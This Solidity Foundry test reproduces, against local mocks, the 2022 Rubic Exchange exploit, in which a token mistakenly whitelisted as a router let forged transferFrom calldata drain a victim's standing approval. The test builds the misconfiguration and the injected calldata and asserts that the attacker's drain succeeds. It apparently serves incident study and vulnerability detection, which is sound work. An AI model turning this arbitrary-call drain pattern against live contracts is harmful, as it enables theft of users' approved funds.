// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {RubicProxyClone} from "../fixtures/malicious-calldata/b-incident/RubicProxyClone.sol";

/// @title malicious-calldata tier (b): Rubic Exchange exploit (2022-12-25, Ethereum, ~$1.4M).
/// @notice Minimized offline reproduction of the documented mechanism: the proxy forwarded
///         caller-supplied calldata to any whitelisted "router", and a TOKEN (USDC) had been
///         mistakenly whitelisted. The attacker used the token as the router and
///         transferFrom(victim, attacker, amount) as the calldata; the proxy executed it as
///         msg.sender and drained the victim's standing approval. See PROVENANCE.md.
contract RubicProxyIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 120_000e18; // representative, scaled
    address constant ADMIN = address(0xADA1);
    address constant VICTIM = address(0x7211);
    address constant ATTACKER = address(0xBAD52);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_rubic_whitelistedToken_arbitraryCall_drains() public {
        MockERC20 token = new MockERC20();
        RubicProxyClone proxy = new RubicProxyClone();

        // Misconfiguration that caused the incident: a TOKEN is added to the router whitelist.
        vm.prank(ADMIN);
        proxy.setWhitelisted(address(token), true);

        // A user holds funds and grants the proxy an approval (the exploited standing state).
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(proxy), type(uint256).max);

        // ATTACK: route through the whitelisted token with transferFrom(victim -> attacker).
        bytes memory injected =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM, ATTACKER, VICTIM_BALANCE);
        vm.prank(ATTACKER);
        proxy.routerCall(address(token), injected);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("rubic-router-whitelist-victim", drained);

        assertTrue(drained, "whitelisted-token arbitrary call should drain the approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim");
    }
}
